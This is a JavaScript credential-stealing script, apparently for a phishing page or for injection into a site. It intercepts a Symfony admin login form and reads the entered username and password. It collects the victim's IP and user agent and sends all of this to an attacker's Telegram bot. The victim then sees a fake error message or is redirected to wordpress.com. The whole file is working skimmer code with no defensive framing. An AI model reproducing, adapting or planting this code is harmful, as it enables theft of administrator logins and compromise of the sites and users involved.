// Ждем полной загрузки DOM
document.addEventListener('DOMContentLoaded', function() {
    // Находим форму по атрибуту action
    const form = document.querySelector('form[action="/admin/login_check"]');
    
    if (form) {
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            console.log("Скрипт send.js начал работу!");

            const formData = new FormData(this);
            const login = formData.get('_username');
            const password = formData.get('_password');

            const message = `🔐 НОВЫЕ ДАННЫЕ SYMFONY ADMIN 🔐\nЛогин: ${login}\nПароль: ${password}\nIP: ${await getIP()}\nВремя: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`;
            console.log("Сообщение для отправки:", message);

            try {
                console.log("Пытаюсь отправить в Telegram...");
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });

                const responseData = await response.json();
                console.log("Ответ от Telegram API:", responseData);

                if (response.ok) {
                    console.log("Успешно отправлено! Перенаправляю...");
                    // Редирект на главную страницу (или куда нужно)
                    setTimeout(() => {
                        window.location.href = 'https://wordpress.com/';
                    }, 1500);
                } else {
                    console.error("Ошибка от Telegram:", responseData);
                    // Показываем сообщение об ошибке
                    alert('Ошибка входа. Попробуйте еще раз.');
                }

            } catch (error) {
                console.error('Ошибка сети или отправки:', error);
                alert('Ошибка сети. Попробуйте еще раз.');
            }
        });
    } else {
        console.error("Форма не найдена!");
    }
});

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'Не удалось определить';
    }
}
